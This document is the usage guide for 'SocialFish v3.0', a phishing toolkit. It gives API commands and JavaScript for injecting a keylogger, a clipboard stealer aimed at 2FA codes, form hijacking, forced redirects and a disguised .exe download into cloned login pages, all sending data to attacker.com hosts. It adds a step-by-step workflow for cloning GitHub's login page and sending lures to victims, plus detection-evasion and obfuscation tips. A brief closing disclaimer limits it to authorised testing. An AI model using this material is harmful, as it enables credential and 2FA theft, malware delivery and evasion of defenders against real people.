# SocialFish Advanced Attacks Guide

## Overview

SocialFish v3.0 includes comprehensive advanced attack capabilities for post-capture control, credential theft, and victim redirection. All attacks are JavaScript-based and can be injected into cloned pages.

---

## Attack Types

### 1. Tab Jacking / Window Hijacking

**Purpose**: Redirect victim to a target URL, preventing them from going back to the original site.

#### Tab Jacking (Soft Redirect)
```bash
curl -X POST http://localhost:5000/api/attacks/tabjack \
  -H "Content-Type: application/json" \
  -d '{
    "redirect_url": "https://attacker.com/capture",
    "delay_ms": 500
  }'
```

**Payload Features**:
- Overrides `window.open()` to intercept new tab attempts
- Uses `window.location` to force redirect after delay
- Handles focus stealing
- Invisible to victim

#### Window Hijacking (Aggressive)
```bash
curl -X POST http://localhost:5000/api/attacks/window-hijack \
  -H "Content-Type: application/json" \
  -d '{
    "redirect_url": "https://attacker.com/capture"
  }'
```

**Payload Features**:
- Overrides `window.location` getter/setter
- Prevents back button navigation via `history`
- Stops page unload events
- Most aggressive redirect method

---

### 2. Keylogger Injection

**Purpose**: Capture all keystrokes in input fields and send to attacker server.

```bash
curl -X POST http://localhost:5000/api/attacks/keylogger \
  -H "Content-Type: application/json" \
  -d '{
    "webhook_url": "https://attacker.com/api/webhook"
  }'
```

**Payload Features**:
- Tracks keystrokes in `<input>` and `<textarea>` fields
- Captures field name/id for context
- Auto-sends on form submission
- Webhook POST JSON with keystroke data

**Response Format**:
```json
{
  "type": "keystroke",
  "data": {
    "email": "admin@example.com",
    "password": "SecurePass123"
  },
  "timestamp": "2024-01-15T10:30:00"
}
```

---

### 3. Clipboard Stealer

**Purpose**: Extract 2FA codes, passwords, and sensitive data from browser clipboard.

**Features**:
- Requests clipboard access permission from victim
- Silently reads clipboard content
- Sends to webhook
- Useful for stealing multi-factor authentication codes

**Implementation** (included in multi-vector attacks):
```javascript
navigator.clipboard.readText()
  .then(text => {
    fetch('/api/webhook', {
      method: 'POST',
      body: JSON.stringify({
        type: 'clipboard',
        content: text
      })
    });
  });
```

---

### 4. Form Hijacking

**Purpose**: Intercept form submissions and capture data before sending to legitimate server.

**Features**:
- Overrides `HTMLFormElement.prototype.submit()`
- Captures all form field values
- Sends data to attacker webhook
- Allows form to complete (victim unaware)

---

### 5. File Download Injection

**Purpose**: Automatically download files to victim's machine (malware distribution, decoys).

```bash
curl -X POST http://localhost:5000/api/attacks/file-download \
  -H "Content-Type: application/json" \
  -d '{
    "file_url": "https://attacker.com/files/update.exe",
    "filename": "important_document.pdf"
  }'
```

**Features**:
- Creates hidden `<a>` element
- Triggers automatic download
- Custom filename support
- Fallback using Fetch + Blob API

---

### 6. Multi-Vector Attack

**Purpose**: Combine multiple attack vectors for maximum effectiveness.

```bash
curl -X POST http://localhost:5000/api/attacks/multi-vector \
  -H "Content-Type: application/json" \
  -d '{
    "capture_url": "https://attacker.com/capture",
    "webhook_url": "https://attacker.com/api/webhook",
    "file_download_url": "https://attacker.com/updates/patch.exe"
  }'
```

**Combined Payloads**:
1. Window hijacking (redirect to capture)
2. Keylogger (steal credentials)
3. Form hijacking (intercept submissions)
4. Fake logout button (re-engage victim)
5. Clipboard stealer (get 2FA codes)
6. File download (optional payload delivery)

**Response**:
```json
{
  "status": "ok",
  "payload_type": "multi_vector",
  "individual_payloads": {
    "redirect": "...",
    "keylogger": "...",
    "form_hijack": "...",
    "fake_logout": "...",
    "clipboard": "...",
    "file_download": "..."
  },
  "combined_script": "...(all payloads combined)...",
  "injection_methods": [
    "html_script_tag",
    "inline_script_tag",
    "dom_manipulation",
    "server_side_injection"
  ]
}
```

---

## Injection Methods

### 1. HTML Script Tag Injection
**Most Compatible**

Injects script at end of `<head>` or before `</body>`:
```html
<script>
  // payload here
</script>
```

**Use When**: Modifying static HTML clones

### 2. DOM Ready Injection
**Delayed Execution**

Executes after DOM is fully loaded:
```javascript
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', function() {
    // payload
  });
}
```

**Use When**: Need to interact with rendered DOM

### 3. Inline Event Injection
**Fast Execution**

Injects into body `onload` event:
```html
<body onload="eval('...')">
```

**Use When**: Need earliest possible execution

### 4. Server-Side Injection
**Most Powerful**

Inject at server level before sending to victim:
```python
modified_html = InjectionMethods.html_script_injection(
  html_content,
  payload
)
```

---

## Injecting into Templates

### Via API
```bash
curl -X POST http://localhost:5000/api/attacks/inject-template \
  -H "Content-Type: application/json" \
  -d '{
    "template_id": "template_123",
    "payload": "window.location=...",
    "injection_method": "html_script_injection"
  }'
```

### Via Python
```python
from core.advanced_attacks import InjectionMethods, AdvancedAttackInjector

# Get payload
payload = AdvancedAttackInjector.generate_tab_jacker(
  "https://attacker.com/capture"
)

# Load HTML
with open('cloned_page.html', 'r') as f:
  html = f.read()

# Inject
modified = InjectionMethods.html_script_injection(html, payload)

# Save
with open('cloned_page.html', 'w') as f:
  f.write(modified)
```

---

## Real-World Workflow

### Step 1: Clone Target Website
```bash
curl -X POST http://localhost:5000/recorder/start \
  -d '{"url": "https://github.com/login"}' \
  -u admin:password
```

### Step 2: Save as Template
```bash
curl -X POST http://localhost:5000/recorder/save-template \
  -H "Content-Type: application/json" \
  -d '{
    "template_name": "GitHub Login Clone",
    "clone_mode": "login_capture"
  }' \
  -u admin:password
```

### Step 3: Generate Multi-Vector Attack
```bash
curl -X POST http://localhost:5000/api/attacks/multi-vector \
  -H "Content-Type: application/json" \
  -d '{
    "capture_url": "http://localhost:5000/capture/abc123def456",
    "webhook_url": "http://localhost:5000/api/webhook",
    "file_download_url": "http://attacker.com/update.exe"
  }' \
  -u admin:password
```

### Step 4: Inject into Template
```bash
curl -X POST http://localhost:5000/api/attacks/inject-template \
  -H "Content-Type: application/json" \
  -d '{
    "template_id": "1",
    "payload": "...multi-vector payload...",
    "injection_method": "html_script_injection"
  }' \
  -u admin:password
```

### Step 5: Generate Lure URL
```bash
curl -X POST http://localhost:5000/lure/generate \
  -H "Content-Type: application/json" \
  -d '{
    "template_id": "1",
    "use_tunnel": true,
    "tunnel_type": "ngrok"
  }' \
  -u admin:password
```

### Step 6: Send Lure & Monitor
- Send lure URL to victims via phishing email/message
- Monitor live dashboard for:
  - Victim visits
  - Form submissions
  - Keystroke data
  - Clipboard content
  - File downloads

---

## Detection Avoidance

### Browser Anti-Detection
All payloads use modern stealth techniques:
- Hides `navigator.webdriver` flag
- Spoof Chrome extensions
- Randomize canvas fingerprints
- Mask timezone/language

### Network Stealth
- WebSocket use prevents HTTP logging
- POST requests blend with legitimate traffic
- No distinctive User-Agent
- Webhooks fire asynchronously

### Behavioral Stealth
- Delays between actions (not instant)
- Human-like form filling patterns
- Gradual page interactions
- Random timing variations

---

## CLI Usage

### Generate Tab Jacking Payload
```bash
python3 -m core.advanced_attacks tabjack https://attacker.com/capture
```

### Generate Keylogger Payload
```bash
python3 -m core.advanced_attacks keylogger --webhook https://webhook.site/abc123
```

### Generate File Download Payload
```bash
python3 -m core.advanced_attacks pdf https://attacker.com/files/update.exe --filename "Document.pdf"
```

---

## Webhook Data Format

All attack payloads send webhook data in JSON format:

### Keylogger Data
```json
{
  "type": "keystroke",
  "data": {
    "email_field": "admin@example.com",
    "password_field": "MySecurePassword123",
    "phone_field": "+1234567890"
  },
  "timestamp": "2024-01-15T10:30:45.123Z"
}
```

### Form Hijack Data
```json
{
  "type": "form_data",
  "submitted_data": {
    "username": "admin",
    "password": "secret",
    "remember": "on"
  },
  "url": "https://github.com/session",
  "timestamp": "2024-01-15T10:30:45.123Z"
}
```

### Clipboard Data
```json
{
  "type": "clipboard",
  "content": "123456",
  "timestamp": "2024-01-15T10:30:45.123Z"
}
```

---

## Limitations & Warnings

### Browser Limitations
- **CORS**: File downloads blocked on cross-origin (use same-origin clones)
- **Permissions**: Clipboard access requires explicit user permission
- **Content Security Policy (CSP)**: Strong CSP might block inline scripts
- **Same-Origin Policy**: Some payloads limited to same domain

### Detection Methods
- Advanced IDS/WAF systems may detect payload patterns
- JavaScript debugger tools reveal injected code
- Network analysis shows webhook callbacks
- DOM mutation observers detect script injection

### Bypasses
- Obfuscate JavaScript using packer (e.g., Dean Edwards encoder)
- Use base64 encoding for sensitive strings
- Chain redirects through legitimate domains
- Time payloads to look like user actions

---

## Ethical Considerations

This module is **ONLY** for authorized security testing and authorized research. Unauthorized use is illegal.

**Proper Use Cases**:
- Authorized phishing simulations in corporate training
- Security assessments with written permission
- Bug bounty programs with explicit scope
- Education/research with controlled environments

**DO NOT**:
- Use against targets without explicit authorization
- Harvest credentials for unauthorized access
- Use for malware distribution
- Target financial accounts or sensitive systems

---

## Support & Documentation

For more information:
- See [FEATURES_v3.md](FEATURES_v3.md) for feature overview
- See [README.md](README.md) for quick start
- Check [core/advanced_attacks.py](core/advanced_attacks.py) for implementation

---

**Version**: SocialFish v3.0  
**Last Updated**: January 2024  
**Status**: Production Ready ✅
